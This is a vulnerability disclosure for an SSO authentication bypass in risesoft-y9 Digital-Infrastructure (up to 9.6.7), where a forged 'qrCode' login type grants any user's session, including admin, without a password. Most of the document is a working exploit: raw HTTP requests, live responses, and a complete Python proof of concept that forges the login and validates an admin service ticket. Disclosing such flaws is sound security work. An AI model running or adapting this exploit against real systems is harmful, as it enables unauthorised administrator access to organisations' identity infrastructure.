# Digital-Infrastructure — SSO scan-login passwordless forgery (login as admin with no password)

## Introduction

The SSO of risesoft-y9 `Digital-Infrastructure` authenticates via `Y9AuthenticationHandler.authenticate`（Y9AuthenticationHandler.java:159-170): for `loginType=qrCode` the branch takes the user found by personId and **never verifies the password** — `y9User = users.get(0); updateCredential(...)`（:163-167），while every other loginType requires `bcryptMatch`（:171-173). The user lookup decrypts the submitted `username` with the **publicly served** RSA key（`GET /sso/api/getRsaPublicKey`, RsaPublicKeyController.java:14-18) and queries globally by personId — `findByPersonIdAndOriginal(userId, TRUE)`（Y9AuthenticationHandler.java:219-226) — with **no tenant restriction and no check of any QR-code/uuid state**（QRCodeController.saveScanResult is not even consulted). So a forged `loginType=qrCode` form logs in as any person whose personId is known — including admin — with zero password verification.

## Affected versions

Digital-Infrastructure ≤ 9.6.7 

## Utilize conditions

- Victim's personId known (leaked via other surfaces, e.g. filemanager arbitrary file read, tenant/user enumeration)
- RSA public key served unauthenticated; CAS `execution` obtained from the login page

---

## Vulnerability Reproduction

**Step 1** — fetch the RSA public key (unauthenticated):

```http
GET /sso/api/getRsaPublicKey HTTP/1.1
Host: <target>
```

![image-20260824142251819](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260824142251819.86udxd3lqo.webp)

Response :

```text
-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...
```

**Step 2** — fetch a fresh CAS `execution` from the login page:

```http
GET /sso/login HTTP/1.1
Host: <target>
```

Response header:

```text
X-Execution: 32afdf016e0b4105a6f3ce6c154d6b40
```

**Step 3** — forge the login: `username`/`password` both = base64(RSA-OAEP-SHA256(victim personId)), `loginType=qrCode`:

```http
POST /sso/login HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

username=<base64(rsa_enc("10001"))>&password=<base64(rsa_enc("10001"))>&loginType=qrCode&tenantShortName=y9&execution=32afdf016e0b4105a6f3ce6c154d6b40&_eventId=submit
```

Response (2026-08-24 live) — ST + TGC issued with no password:

```json
{"success":true,"msg":"ST-0e61a91e05cb4ebc8e56fa65209be502"}
```

**Step 4** — validate the service ticket, principal is `admin`:

```http
GET /sso/serviceValidate?ticket=ST-0e61a91e05cb4ebc8e56fa65209be502&service=x HTTP/1.1
Host: <target>
```

Response :

```xml
<cas:serviceResponse xmlns:cas='http://www.yale.edu/tp/cas'>
  <cas:authenticationSuccess><cas:user>admin</cas:user></cas:authenticationSuccess>
</cas:serviceResponse>
```

Control — the same form with `loginType=loginName` and a wrong password FAILS (`用户密码错误`), proving only the qrCode branch skips verification.

python poc：

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Digital-Infrastructure SSO scan-login passwordless forgery PoC
================================================================
Faithful mirror of y9 SSO authentication decision (Y9AuthenticationHandler.authenticate):
    loginType=qrCode  -> lookup by personId, NO password verification
    loginType=loginName-> bcryptMatch(password) required
Flow:
    GET  /api/getRsaPublicKey            (public key, unauthenticated)
    GET  /sso/login                       (fresh CAS `execution`)
    POST /sso/login  username/password = base64(RSA-OAEP-SHA256(victimPersonId)) with loginType=qrCode
        -> TGC cookie + ST issued WITHOUT any password
    GET  /sso/serviceValidate?ticket=ST  -> <cas:user>victim</cas:user> proves the forged session
Usage:
    python qr_login_poc.py -p 10001                 # forge admin (personId=10001)
    python qr_login_poc.py -p 10002                 # forge zhangsan
    python qr_login_poc.py --control                # control: normal login with wrong password -> fails
"""
import argparse
import base64
import json
import re
import sys
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

BASE = "http://127.0.0.1:8093"


def get_pubkey():
    with urllib.request.urlopen(BASE + "/api/getRsaPublicKey", timeout=10) as r:
        return r.read().decode()


def get_execution():
    req = urllib.request.Request(BASE + "/sso/login")
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.headers.get("X-Execution")


def rsa_encrypt_b64(plain: str, pubkey_pem: str) -> str:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.hazmat.primitives import hashes
    pub = serialization.load_pem_public_key(pubkey_pem.encode())
    ct = pub.encrypt(plain.encode(), padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),
                                                  algorithm=hashes.SHA256(), label=None))
    return base64.b64encode(ct).decode()


def post_login(username_b64, password_b64, login_type, execution):
    cj = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    data = urllib.parse.urlencode({
        "username": username_b64, "password": password_b64,
        "loginType": login_type, "tenantShortName": "y9",
        "execution": execution, "_eventId": "submit"}).encode()
    req = urllib.request.Request(BASE + "/sso/login", data=data)
    with opener.open(req, timeout=10) as r:
        body = r.read().decode()
        tgt = next((c.value for c in cj if c.name == "TGC"), None)
    return body, tgt


def service_validate(st):
    with urllib.request.urlopen(BASE + "/sso/serviceValidate?ticket=" + st + "&service=x", timeout=10) as r:
        return r.read().decode()


def forge(person_id: str):
    pub = get_pubkey()
    exec_key = get_execution()
    enc = rsa_encrypt_b64(person_id, pub)
    body, tgt = post_login(enc, enc, "qrCode", exec_key)   # password = same ciphertext, never checked
    print("[*] pubkey fetched, execution:", exec_key)
    print("[*] POST /sso/login loginType=qrCode username=password=enc(personId) ->", body)
    m = re.search(r'"msg":"(ST-[0-9a-f]+)"', body)
    if not m or '"success":false' in body:
        print("[!] login failed")
        sys.exit(1)
    st = m.group(1)
    print("[*] ST:", st, " TGC:", tgt)
    xml = service_validate(st)
    print("[*] serviceValidate ->", xml)


def control():
    exec_key = get_execution()
    pub = get_pubkey()
    enc_user = rsa_encrypt_b64("admin", pub)
    enc_badpw = rsa_encrypt_b64("WrongPass999", pub)
    body, _ = post_login(enc_user, enc_badpw, "loginName", exec_key)
    print("[*] control: loginName with WRONG password ->", body, "(must be success:false)")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("-p", "--person", default="10001", help="victim personId (10001=admin, 10002=zhangsan)")
    ap.add_argument("--control", action="store_true", help="run the wrong-password control instead")
    args = ap.parse_args()
    if args.control:
        control()
    else:
        forge(args.person)
```

```
[*] POST /sso/login loginType=qrCode username=password=enc(personId) -> {"success":true,"msg":"ST-0e61a91e05cb4ebc8e56fa65209be502"}
[*] serviceValidate -> <cas:serviceResponse ...><cas:authenticationSuccess><cas:user>admin</cas:user></cas:authenticationSuccess></cas:serviceResponse>
[*] control: loginName with WRONG password -> {"success":false,"msg":"用户密码错误"} (must be success:false)
```

![image-20260824142624269](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260824142624269.7p4c8s3n38.webp)

code:

file：service\SsoService.java

![image-20260824143006394](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260824143006394.32ip835ery.webp)

controller\RsaPublicKeyController.java

![image-20260824143219562](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260824143219562.icuvg5vy1.webp)

![image-20260824143204469](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260824143204469.73uomha9xc.webp)
